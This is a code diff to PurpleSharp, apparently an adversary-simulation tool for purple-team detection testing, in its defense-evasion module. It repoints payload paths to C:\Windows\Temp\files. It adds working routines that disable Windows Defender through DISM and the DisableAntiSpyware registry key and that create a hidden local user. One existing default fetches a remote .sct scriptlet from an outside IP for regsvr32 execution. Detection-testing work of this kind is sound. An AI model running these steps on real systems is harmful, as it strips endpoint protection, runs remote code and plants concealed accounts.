@@ -1,6 +1,7 @@
 ﻿using System;
 using System.Collections.Generic;
 using System.Diagnostics;
+using System.DirectoryServices.AccountManagement;
 using System.Linq;
 using System.Text;
 using System.Threading.Tasks;
@@ -21,7 +22,7 @@ namespace PurpleSharp.Simulations
             string filePath = playbookTask.filePath;
             if (filePath == null)
             {
-                filePath = @".\file\T1218.003.txt";
+                filePath = @"C:\Windows\Temp\files\T1218.003.txt";
             }
             try
             {
@@ -40,10 +41,7 @@ namespace PurpleSharp.Simulations
             Lib.Logger logger = new Lib.Logger(currentPath + log);
             logger.SimulationHeader("T1218.010");
             string url = playbookTask.url;
-            if (url == null)
-            {
-                url =  @"http://100.1.1.169:8080/T1218.010.sct";
-            }
+            if (url == null) url =  @"http://100.1.1.169:8080/T1218.010.sct";
             try
             {
                 string dll = "scrobj.dll";
@@ -65,7 +63,7 @@ namespace PurpleSharp.Simulations
             string filePath = playbookTask.filePath;
             if (filePath == null)
             {
-                filePath = @".\files\T1218.004.exe";
+                filePath = @"C:\Windows\Temp\files\T1218.004.exe";
             }
             try
             {
@@ -86,7 +84,7 @@ namespace PurpleSharp.Simulations
             string filePath = playbookTask.filePath;
             if (filePath == null)
             {
-                filePath = @".\files\T1218.009.dll";
+                filePath = @"C:\Windows\Temp\files\T1218.009.dll";
             }
             try
             {
@@ -114,7 +112,7 @@ namespace PurpleSharp.Simulations
             }
             if (filePath == null)
             {
-                filePath =  @"C:\Windows\Temp\T1197.exe";
+                filePath =  @"C:\Windows\Temp\files\T1197.exe";
             }
             
             try
@@ -157,7 +155,7 @@ namespace PurpleSharp.Simulations
             string filePath = playbookTask.filePath;
             if (filePath == null)
             {
-                filePath = @".\file\T1140.txt";
+                filePath = @"C:\Windows\Temp\files\T1140.txt";
             }
             try
             {
@@ -203,7 +201,7 @@ namespace PurpleSharp.Simulations
             string filePath = playbookTask.filePath;
             if (filePath == null)
             {
-                filePath = @".\files\T1218.011.dll";
+                filePath = @"C:\Windows\Temp\files\T1218.011.dll";
             }
             try
             {
@@ -403,5 +401,50 @@ namespace PurpleSharp.Simulations
 
         }
 
+        public static void DisableWinDefender(string log, PlaybookTask playbookTask)
+        {
+            string currentPath = AppDomain.CurrentDomain.BaseDirectory;
+            Logger logger = new Lib.Logger(currentPath + log);
+            logger.SimulationHeader("T1562.001");
+            switch (playbookTask.variation)
+            {
+                case 1:
+                    logger.TimestampInfo("Disable Windows Defender with DISM");
+                    ExecutionHelper.StartProcessApi("",
+                        @"Dism /online /Disable-Feature /FeatureName:Windows-Defender /Remove /NoRestart /quiet",
+                        logger);
+                    break;
+                case 2:
+                    logger.TimestampInfo("Tamper with Windows Defender Registry");
+                    string powershellCommand =
+                        "Set-ItemProperty \"HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\" -Name DisableAntiSpyware -Value 1";
+                    ExecutionHelper.StartPowershellNet(powershellCommand, logger);
+                    break;
+                default:
+                    break;
+            }
+        }
+
+        public static void CreateHiddenUser(string log, PlaybookTask playbookTask)
+        {
+            string currentPath = AppDomain.CurrentDomain.BaseDirectory;
+            Logger logger = new Lib.Logger(currentPath + log);
+            logger.SimulationHeader("T1564.002");
+            if (playbookTask.user == null) playbookTask.user = "purple";
+            using (PrincipalContext context = new PrincipalContext(ContextType.Machine))
+            {
+                UserPrincipal user = UserPrincipal.FindByIdentity(context, IdentityType.SamAccountName, playbookTask.user);
+
+                if (user == null)
+                {
+                    logger.TimestampInfo("新建用户");
+                    PersistenceHelper.CreateUserApi(playbookTask.user, playbookTask.password, logger, false);
+                }
+                
+                DefenseEvasionHelper.HiddenUser(playbookTask.user, logger);
+                
+            }
+
+        }
     }
 }
